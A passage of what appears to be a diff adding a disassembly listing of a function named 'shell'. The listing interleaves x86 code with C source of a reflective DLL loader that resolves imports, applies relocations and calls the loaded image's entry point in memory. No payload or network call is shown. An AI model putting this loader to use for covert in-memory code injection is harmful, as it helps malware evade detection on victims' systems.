+00405A06 8B 4D C4             mov         ecx,dword ptr [ebp-3Ch]
+00405A09 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405A0C 8A 02                mov         al,byte ptr [edx]
+00405A0E 88 01                mov         byte ptr [ecx],al
+00405A10 8B 4D C4             mov         ecx,dword ptr [ebp-3Ch]
+00405A13 83 C1 01             add         ecx,1
+00405A16 89 4D C4             mov         dword ptr [ebp-3Ch],ecx
+00405A19 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405A1C 83 C2 01             add         edx,1
+00405A1F 89 55 C0             mov         dword ptr [ebp-40h],edx
+00405A22 EB D2                jmp         shell+3F6h (004059f6)
+418:
+419:          // get the VA of the next section
+420:          uiValueA += sizeof( IMAGE_SECTION_HEADER );
+00405A24 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+00405A27 83 C0 28             add         eax,28h
+00405A2A 89 45 C8             mov         dword ptr [ebp-38h],eax
+421:      }
+00405A2D EB 96                jmp         shell+3C5h (004059c5)
+422:
+423:      // STEP 4: process our images import table...
+424:
+425:      // uiValueB = the address of the import directory
+426:      uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
+00405A2F 8B 4D CC             mov         ecx,dword ptr [ebp-34h]
+00405A32 81 C1 80 00 00 00    add         ecx,80h
+00405A38 89 4D C4             mov         dword ptr [ebp-3Ch],ecx
+427:
+428:      // we assume their is an import table to process
+429:      // uiValueC is the first entry in the import table
+430:      uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
+00405A3B 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+00405A3E 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405A41 03 02                add         eax,dword ptr [edx]
+00405A43 89 45 C0             mov         dword ptr [ebp-40h],eax
+431:
+432:      // itterate through all imports
+433:      while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
+00405A46 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+00405A49 83 79 0C 00          cmp         dword ptr [ecx+0Ch],0
+00405A4D 0F 84 F8 00 00 00    je          shell+54Bh (00405b4b)
+434:      {
+435:          // use LoadLibraryA to load the imported module into memory
+436:          uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );
+00405A53 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405A56 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405A59 03 42 0C             add         eax,dword ptr [edx+0Ch]
+00405A5C 8B F4                mov         esi,esp
+00405A5E 50                   push        eax
+00405A5F FF 55 FC             call        dword ptr [ebp-4]
+00405A62 3B F4                cmp         esi,esp
+00405A64 E8 57 7C 00 00       call        __chkesp (0040d6c0)
+00405A69 89 45 E8             mov         dword ptr [ebp-18h],eax
+437:
+438:          // uiValueD = VA of the OriginalFirstThunk
+439:          uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
+00405A6C 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+00405A6F 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+00405A72 03 11                add         edx,dword ptr [ecx]
+00405A74 89 55 BC             mov         dword ptr [ebp-44h],edx
+440:
+441:          // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
+442:          uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );
+00405A77 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+00405A7A 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+00405A7D 03 48 10             add         ecx,dword ptr [eax+10h]
+00405A80 89 4D C8             mov         dword ptr [ebp-38h],ecx
+443:
+444:          // itterate through all imported functions, importing by ordinal if no name present
+445:          while( DEREF(uiValueA) )
+00405A83 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405A86 83 3A 00             cmp         dword ptr [edx],0
+00405A89 0F 84 AE 00 00 00    je          shell+53Dh (00405b3d)
+446:          {
+447:              // sanity check uiValueD as some compilers only import by FirstThunk
+448:              if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
+00405A8F 83 7D BC 00          cmp         dword ptr [ebp-44h],0
+00405A93 74 64                je          shell+4F9h (00405af9)
+00405A95 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405A98 8B 08                mov         ecx,dword ptr [eax]
+00405A9A 81 E1 00 00 00 80    and         ecx,80000000h
+00405AA0 85 C9                test        ecx,ecx
+00405AA2 74 55                je          shell+4F9h (00405af9)
+449:              {
+450:                  // get the VA of the modules NT Header
+451:                  uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
+00405AA4 8B 55 E8             mov         edx,dword ptr [ebp-18h]
+00405AA7 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+00405AAA 03 42 3C             add         eax,dword ptr [edx+3Ch]
+00405AAD 89 45 D8             mov         dword ptr [ebp-28h],eax
+452:
+453:                  // uiNameArray = the address of the modules export directory entry
+454:                  uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+00405AB0 8B 4D D8             mov         ecx,dword ptr [ebp-28h]
+00405AB3 83 C1 78             add         ecx,78h
+00405AB6 89 4D DC             mov         dword ptr [ebp-24h],ecx
+455:
+456:                  // get the VA of the export directory
+457:                  uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
+00405AB9 8B 55 DC             mov         edx,dword ptr [ebp-24h]
+00405ABC 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+00405ABF 03 02                add         eax,dword ptr [edx]
+00405AC1 89 45 D8             mov         dword ptr [ebp-28h],eax
+458:
+459:                  // get the VA for the array of addresses
+460:                  uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
+00405AC4 8B 4D D8             mov         ecx,dword ptr [ebp-28h]
+00405AC7 8B 55 E8             mov         edx,dword ptr [ebp-18h]
+00405ACA 03 51 1C             add         edx,dword ptr [ecx+1Ch]
+00405ACD 89 55 E0             mov         dword ptr [ebp-20h],edx
+461:
+462:                  // use the import ordinal (- export ordinal base) as an index into the array of addresses
+463:                  uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );
+00405AD0 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405AD3 8B 08                mov         ecx,dword ptr [eax]
+00405AD5 81 E1 FF FF 00 00    and         ecx,0FFFFh
+00405ADB 8B 55 D8             mov         edx,dword ptr [ebp-28h]
+00405ADE 2B 4A 10             sub         ecx,dword ptr [edx+10h]
+00405AE1 8B 45 E0             mov         eax,dword ptr [ebp-20h]
+00405AE4 8D 0C 88             lea         ecx,[eax+ecx*4]
+00405AE7 89 4D E0             mov         dword ptr [ebp-20h],ecx
+464:
+465:                  // patch in the address for this imported function
+466:                  DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
+00405AEA 8B 55 E0             mov         edx,dword ptr [ebp-20h]
+00405AED 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+00405AF0 03 02                add         eax,dword ptr [edx]
+00405AF2 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+00405AF5 89 01                mov         dword ptr [ecx],eax
+467:              }
+468:              else
+00405AF7 EB 27                jmp         shell+520h (00405b20)
+469:              {
+470:                  // get the VA of this functions import by name struct
+471:                  uiValueB = ( uiBaseAddress + DEREF(uiValueA) );
+00405AF9 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405AFC 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405AFF 03 02                add         eax,dword ptr [edx]
+00405B01 89 45 C4             mov         dword ptr [ebp-3Ch],eax
+472:
+473:                  // use GetProcAddress and patch in the address for this imported function
+474:                  DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
+00405B04 8B 4D C4             mov         ecx,dword ptr [ebp-3Ch]
+00405B07 83 C1 02             add         ecx,2
+00405B0A 8B F4                mov         esi,esp
+00405B0C 51                   push        ecx
+00405B0D 8B 55 E8             mov         edx,dword ptr [ebp-18h]
+00405B10 52                   push        edx
+00405B11 FF 55 F8             call        dword ptr [ebp-8]
+00405B14 3B F4                cmp         esi,esp
+00405B16 E8 A5 7B 00 00       call        __chkesp (0040d6c0)
+00405B1B 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+00405B1E 89 01                mov         dword ptr [ecx],eax
+475:              }
+476:              // get the next imported function
+477:              uiValueA += sizeof( ULONG_PTR );
+00405B20 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405B23 83 C2 04             add         edx,4
+00405B26 89 55 C8             mov         dword ptr [ebp-38h],edx
+478:              if( uiValueD )
+00405B29 83 7D BC 00          cmp         dword ptr [ebp-44h],0
+00405B2D 74 09                je          shell+538h (00405b38)
+479:                  uiValueD += sizeof( ULONG_PTR );
+00405B2F 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405B32 83 C0 04             add         eax,4
+00405B35 89 45 BC             mov         dword ptr [ebp-44h],eax
+480:          }
+00405B38 E9 46 FF FF FF       jmp         shell+483h (00405a83)
+481:
+482:          // get the next import
+483:          uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
+00405B3D 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+00405B40 83 C1 14             add         ecx,14h
+00405B43 89 4D C0             mov         dword ptr [ebp-40h],ecx
+484:      }
+00405B46 E9 FB FE FF FF       jmp         shell+446h (00405a46)
+485:
+486:      // STEP 5: process all of our images relocations...
+487:
+488:      // calculate the base address delta and perform relocations (even if we load at desired image base)
+489:      uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
+00405B4B 8B 55 CC             mov         edx,dword ptr [ebp-34h]
+00405B4E 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405B51 2B 42 34             sub         eax,dword ptr [edx+34h]
+00405B54 89 45 E8             mov         dword ptr [ebp-18h],eax
+490:
+491:      // uiValueB = the address of the relocation directory
+492:      uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
+00405B57 8B 4D CC             mov         ecx,dword ptr [ebp-34h]
+00405B5A 81 C1 A0 00 00 00    add         ecx,0A0h
+00405B60 89 4D C4             mov         dword ptr [ebp-3Ch],ecx
+493:
+494:      // check if their are any relocations present
+495:      if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
+00405B63 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+00405B66 83 7A 04 00          cmp         dword ptr [edx+4],0
+00405B6A 0F 84 AD 01 00 00    je          shell+71Dh (00405d1d)
+496:      {
+497:          // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
+498:          uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
+00405B70 8B 45 C4             mov         eax,dword ptr [ebp-3Ch]
+00405B73 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+00405B76 03 08                add         ecx,dword ptr [eax]
+00405B78 89 4D C0             mov         dword ptr [ebp-40h],ecx
+499:
+500:          // and we itterate through all entries...
+501:          while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
+00405B7B 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405B7E 83 7A 04 00          cmp         dword ptr [edx+4],0
+00405B82 0F 84 95 01 00 00    je          shell+71Dh (00405d1d)
+502:          {
+503:              // uiValueA = the VA for this relocation block
+504:              uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );
+00405B88 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+00405B8B 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]
+00405B8E 03 08                add         ecx,dword ptr [eax]
+00405B90 89 4D C8             mov         dword ptr [ebp-38h],ecx
+505:
+506:              // uiValueB = number of entries in this relocation block
+507:              uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
+00405B93 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405B96 8B 42 04             mov         eax,dword ptr [edx+4]
+00405B99 83 E8 08             sub         eax,8
+00405B9C D1 E8                shr         eax,1
+00405B9E 89 45 C4             mov         dword ptr [ebp-3Ch],eax
+508:
+509:              // uiValueD is now the first entry in the current relocation block
+510:              uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
+00405BA1 8B 4D C0             mov         ecx,dword ptr [ebp-40h]
+00405BA4 83 C1 08             add         ecx,8
+00405BA7 89 4D BC             mov         dword ptr [ebp-44h],ecx
+511:
+512:              // we itterate through all the entries in the current block...
+513:              while( uiValueB-- )
+00405BAA 8B 55 C4             mov         edx,dword ptr [ebp-3Ch]
+00405BAD 8B 45 C4             mov         eax,dword ptr [ebp-3Ch]
+00405BB0 83 E8 01             sub         eax,1
+00405BB3 89 45 C4             mov         dword ptr [ebp-3Ch],eax
+00405BB6 85 D2                test        edx,edx
+00405BB8 0F 84 4E 01 00 00    je          shell+70Ch (00405d0c)
+514:              {
+515:                  // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
+516:                  // we dont use a switch statement to avoid the compiler building a jump table
+517:                  // which would not be very position independent!
+518:                  if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
+00405BBE 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405BC1 66 8B 11             mov         dx,word ptr [ecx]
+00405BC4 66 C1 EA 0C          shr         dx,0Ch
+00405BC8 66 83 E2 0F          and         dx,0Fh
+00405BCC 81 E2 FF FF 00 00    and         edx,0FFFFh
+00405BD2 83 FA 0A             cmp         edx,0Ah
+00405BD5 75 36                jne         shell+60Dh (00405c0d)
+519:                      *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
+00405BD7 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405BDA 66 8B 08             mov         cx,word ptr [eax]
+00405BDD 66 81 E1 FF 0F       and         cx,offset shell+5E0h (00405be0)
+00405BE2 81 E1 FF FF 00 00    and         ecx,0FFFFh
+00405BE8 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405BEB 8B 04 0A             mov         eax,dword ptr [edx+ecx]
+00405BEE 03 45 E8             add         eax,dword ptr [ebp-18h]
+00405BF1 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405BF4 66 8B 11             mov         dx,word ptr [ecx]
+00405BF7 66 81 E2 FF 0F       and         dx,offset shell+5FAh (00405bfa)
+00405BFC 81 E2 FF FF 00 00    and         edx,0FFFFh
+00405C02 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+00405C05 89 04 11             mov         dword ptr [ecx+edx],eax
+520:                  else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
+00405C08 E9 F1 00 00 00       jmp         shell+6FEh (00405cfe)
+00405C0D 8B 55 BC             mov         edx,dword ptr [ebp-44h]
+00405C10 66 8B 02             mov         ax,word ptr [edx]
+00405C13 66 C1 E8 0C          shr         ax,0Ch
+00405C17 66 25 0F 00          and         ax,offset shell+619h (00405c19)
+00405C1B 25 FF FF 00 00       and         eax,0FFFFh
+00405C20 83 F8 03             cmp         eax,3
+00405C23 75 34                jne         shell+659h (00405c59)
+521:                      *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
+00405C25 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405C28 66 8B 11             mov         dx,word ptr [ecx]
+00405C2B 66 81 E2 FF 0F       and         dx,offset shell+62Eh (00405c2e)
+00405C30 81 E2 FF FF 00 00    and         edx,0FFFFh
+00405C36 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+00405C39 8B 0C 10             mov         ecx,dword ptr [eax+edx]
+00405C3C 03 4D E8             add         ecx,dword ptr [ebp-18h]
+00405C3F 8B 55 BC             mov         edx,dword ptr [ebp-44h]
+00405C42 66 8B 02             mov         ax,word ptr [edx]
+00405C45 66 25 FF 0F          and         ax,offset shell+647h (00405c47)
+00405C49 25 FF FF 00 00       and         eax,0FFFFh
+00405C4E 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405C51 89 0C 02             mov         dword ptr [edx+eax],ecx
+522:                  else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
+00405C54 E9 A5 00 00 00       jmp         shell+6FEh (00405cfe)
+00405C59 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405C5C 66 8B 08             mov         cx,word ptr [eax]
+00405C5F 66 C1 E9 0C          shr         cx,0Ch
+00405C63 66 83 E1 0F          and         cx,0Fh
+00405C67 81 E1 FF FF 00 00    and         ecx,0FFFFh
+00405C6D 83 F9 01             cmp         ecx,1
+00405C70 75 39                jne         shell+6ABh (00405cab)
+523:                      *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
+00405C72 8B 55 BC             mov         edx,dword ptr [ebp-44h]
+00405C75 66 8B 02             mov         ax,word ptr [edx]
+00405C78 66 25 FF 0F          and         ax,offset shell+67Ah (00405c7a)
+00405C7C 25 FF FF 00 00       and         eax,0FFFFh
+00405C81 8B 4D E8             mov         ecx,dword ptr [ebp-18h]
+00405C84 C1 E9 10             shr         ecx,10h
+00405C87 8B 55 C8             mov         edx,dword ptr [ebp-38h]
+00405C8A 66 8B 04 02          mov         ax,word ptr [edx+eax]
+00405C8E 66 03 C1             add         ax,cx
+00405C91 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405C94 66 8B 11             mov         dx,word ptr [ecx]
+00405C97 66 81 E2 FF 0F       and         dx,offset shell+69Ah (00405c9a)
+00405C9C 81 E2 FF FF 00 00    and         edx,0FFFFh
+00405CA2 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+00405CA5 66 89 04 11          mov         word ptr [ecx+edx],ax
+524:                  else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
+00405CA9 EB 53                jmp         shell+6FEh (00405cfe)
+00405CAB 8B 55 BC             mov         edx,dword ptr [ebp-44h]
+00405CAE 66 8B 02             mov         ax,word ptr [edx]
+00405CB1 66 C1 E8 0C          shr         ax,0Ch
+00405CB5 66 25 0F 00          and         ax,offset shell+6B7h (00405cb7)
+00405CB9 25 FF FF 00 00       and         eax,0FFFFh
+00405CBE 83 F8 02             cmp         eax,2
+00405CC1 75 3B                jne         shell+6FEh (00405cfe)
+525:                      *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
+00405CC3 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405CC6 66 8B 11             mov         dx,word ptr [ecx]
+00405CC9 66 81 E2 FF 0F       and         dx,offset shell+6CCh (00405ccc)
+00405CCE 81 E2 FF FF 00 00    and         edx,0FFFFh
+00405CD4 8B 45 E8             mov         eax,dword ptr [ebp-18h]
+00405CD7 25 FF FF 00 00       and         eax,0FFFFh
+00405CDC 8B 4D C8             mov         ecx,dword ptr [ebp-38h]
+00405CDF 66 8B 14 11          mov         dx,word ptr [ecx+edx]
+00405CE3 66 03 D0             add         dx,ax
+00405CE6 8B 45 BC             mov         eax,dword ptr [ebp-44h]
+00405CE9 66 8B 08             mov         cx,word ptr [eax]
+00405CEC 66 81 E1 FF 0F       and         cx,offset shell+6EFh (00405cef)
+00405CF1 81 E1 FF FF 00 00    and         ecx,0FFFFh
+00405CF7 8B 45 C8             mov         eax,dword ptr [ebp-38h]
+00405CFA 66 89 14 08          mov         word ptr [eax+ecx],dx
+526:
+527:                  // get the next entry in the current relocation block
+528:                  uiValueD += sizeof( IMAGE_RELOC );
+00405CFE 8B 4D BC             mov         ecx,dword ptr [ebp-44h]
+00405D01 83 C1 02             add         ecx,2
+00405D04 89 4D BC             mov         dword ptr [ebp-44h],ecx
+529:              }
+00405D07 E9 9E FE FF FF       jmp         shell+5AAh (00405baa)
+530:
+531:              // get the next entry in the relocation directory
+532:              uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
+00405D0C 8B 55 C0             mov         edx,dword ptr [ebp-40h]
+00405D0F 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+00405D12 03 42 04             add         eax,dword ptr [edx+4]
+00405D15 89 45 C0             mov         dword ptr [ebp-40h],eax
+533:          }
+00405D18 E9 5E FE FF FF       jmp         shell+57Bh (00405b7b)
+534:      }
+535:      // STEP 6: call our images entry point
+536:
+537:      // uiValueA = the VA of our newly loaded DLL/EXE's entry point
+538:      uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
+00405D1D 8B 4D CC             mov         ecx,dword ptr [ebp-34h]
+00405D20 8B 55 E4             mov         edx,dword ptr [ebp-1Ch]
+00405D23 03 51 28             add         edx,dword ptr [ecx+28h]
+00405D26 89 55 C8             mov         dword ptr [ebp-38h],edx
+539:
+540:      // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
+541:      pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
+00405D29 8B F4                mov         esi,esp
+00405D2B 6A 00                push        0
+00405D2D 6A 00                push        0
+00405D2F 6A FF                push        0FFh
+00405D31 FF 55 F0             call        dword ptr [ebp-10h]
+00405D34 3B F4                cmp         esi,esp
+00405D36 E8 85 79 00 00       call        __chkesp (0040d6c0)
+542:      ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
+00405D3B 8B F4                mov         esi,esp
+00405D3D 6A 00                push        0
+00405D3F 6A 01                push        1
+00405D41 8B 45 E4             mov         eax,dword ptr [ebp-1Ch]
+00405D44 50                   push        eax
+00405D45 FF 55 C8             call        dword ptr [ebp-38h]
+00405D48 3B F4                cmp         esi,esp
+00405D4A E8 71 79 00 00       call        __chkesp (0040d6c0)
+543:      return 0;
+00405D4F 33 C0                xor         eax,eax
+544:  }
+00405D51 5F                   pop         edi
+00405D52 5E                   pop         esi
+00405D53 5B                   pop         ebx
+00405D54 81 C4 98 00 00 00    add         esp,98h
+00405D5A 3B EC                cmp         ebp,esp
+00405D5C E8 5F 79 00 00       call        __chkesp (0040d6c0)
+00405D61 8B E5                mov         esp,ebp
+00405D63 5D                   pop         ebp
+00405D64 C3                   ret
+--- No source file  ---------------------------------------------------------------------------------------------------------------------------------------------
